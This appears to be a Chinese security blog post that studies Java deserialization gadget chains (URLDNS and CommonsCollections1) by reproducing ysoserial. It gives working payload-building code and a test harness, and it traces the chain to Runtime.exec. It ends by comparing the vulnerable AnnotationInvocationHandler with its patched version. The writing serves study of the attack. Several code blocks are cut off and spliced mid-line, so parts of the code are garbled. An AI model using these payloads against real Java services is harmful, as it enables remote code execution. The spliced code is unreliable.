之前都是 ysoserial 一把梭, 还是得学习 + 复现一下内部实现机制的. 主要是对常见的 URLDNS 和
CommonsCollections1-7 这些利用链进行了分析, 相信看完理解其他利用链也不在话下.
## URLDNS
最简单的一个, 这个成因就是 `java.util.HashMap` 重写了 `readObject`, 在反序列化时会调用 `hash` 函数计算 key
的 hashCode.
而 `java.net.URL` 的 hashCode 在计算时会调用 `getHostAddress` 来解析域名, 从而发出 DNS 请求.
可以理解为, 在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和
value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL 这个对象计算 hash
的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求.
整条调用链如下:
    Gadget Chain:
      HashMap.readObject()
        HashMap.putVal()
          HashMap.hash()
            URL.hashCode()
URLDNS.java
    package demo.rmb122;
    import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.net.URL;
    import java.util.HashMap;
    public class URLDNS {
        public static void main(String[] args) throws Exception {
            HashMap hashMap = new HashMap();
            URL url = new URL("http://xxxx.xxx.xxx");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true);
            f.set(url, 0xdeadbeef); // 设一个值, 这样 put 的时候就不会去查询 DNS
            hashMap.put(url, "rmb122");
            f.set(url, -1); // hashCode 这个属性不是 transient 的, 所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
            oos.writeObject(hashMap);
        }
    }
Test.java
    package demo.rmb122;
    import java.io.FileInputStream;
    import java.io.ObjectInputStream;
    public class Test {
        public static void main(String[] args) throws Exception {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
            ois.readObject();
        }
    }
## CommonsCollections1
这个利用链比较复杂, 借 ysoserial 自带的调用栈先看看吧,
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
首先是版本受限, 先看 ysoserial 自带的版本检测 (单元测试的时候用的),
    public static boolean isAnnInvHUniversalMethodImpl() {
        JavaVersion v = JavaVersion.getLocalVersion();
        return v != null && (v.major  paramClass, Map paramMap) {
        Class[] arrayOfClass = paramClass.getInterfaces();
        if (!paramClass.isAnnotation() || arrayOfClass.length != 1 || arrayOfClass[false] != Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type."); 
        this.type = paramClass;
        this.memberValues = paramMap;
    }
    public Object invoke(Object paramObject, Method paramMethod, Object[] paramArrayOfObject) {
        String str = paramMethod.getName();
        Class[] arrayOfClass = paramMethod.getParameterTypes();
        if (str.equals("equals") && arrayOfClass.length == 1 && arrayOfClass[false] == Object.class)
            return equalsImpl(paramArrayOfObject[0]); 
        if (arrayOfClass.length != 0)
            throw new AssertionError("Too many parameters for an annotation method"); 
        switch (str) {
            case "toString":
                return toStringImpl();
            case "hashCode":
                return Integer.valueOf(hashCodeImpl());
            case "annotationType":
                return this.type;
        }
        Object object = this.memberValues.get(str); // ();
            Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);
            constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            // 因为构造方法不是 public, 只能通过反射构造出来
            constructor.setAccessible(true);
            InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);
            Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), new Class[]{Map.class}, invo);
            constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            Object obj = constructor.newInstance(Deprecated.class, proxy);
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
            oos.writeObject(obj);
        }
    }
接下来问题是 java 是如何修复的呢? 一开始不知道已经修复, 复现出来导致还以为自己写错了 233  
看到
    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
才发现有可能是 java 内部类动过的原因.
拿最新版的 `readObject` 与上面 u66 版本的对比一下
    private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
        GetField fields = s.readFields();
        Class t = (Class)fields.get("type", (Object)null);
        Map streamVals = (Map)fields.get("memberValues", (Object)null);
        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(t);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }
        Map> memberTypes = annotationType.memberTypes();
        Map mv = new LinkedHashMap();
        String name;
        Object value;
        for(Iterator var8 = streamVals.entrySet().iterator(); var8.hasNext(); mv.put(name, value)) {
            Entry memberValue = (Entry)var8.next();
            name = (String)memberValue.getKey();
            value = null;
            Class memberType = (Class)memberTypes.get(name);
            if (memberType != null) {
                value = memberValue.getValue();
                if (!memberType.isInstance(value) && !(value instanceof ExceptionProxy)) {
                    value = (new AnnotationTypeMismatchExceptionProxy(value.getClass() + "[" + value + "]")).setMember((Method)annotationType.members().get(name));
                }
            }
        }
        AnnotationInvocationHandler.UnsafeAccessor.setType(this, t);
        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, mv);
    }
可以看到很明显的两处变化是
    AnnotationInvocationHandler.UnsafeAccessor.setType(this, t);
    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, mv);
其将反序列化后的 memberValues 设为了 mv, 而 mv 是
    Map mv = new LinkedHashMap();